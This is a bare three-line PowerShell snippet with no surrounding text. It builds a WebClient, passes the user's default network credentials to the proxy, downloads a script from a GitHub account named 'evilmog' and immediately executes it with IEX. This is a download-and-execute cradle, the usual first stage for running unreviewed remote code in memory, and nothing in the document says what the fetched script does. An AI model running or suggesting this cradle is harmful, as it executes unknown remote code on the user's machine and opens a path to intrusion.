$browser = New-Object System.Net.WebClient
$browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials 

IEX $browser.downloadstring("https://raw.githubusercontent.com/evilmog/evilmog/master/powershell.ps1")
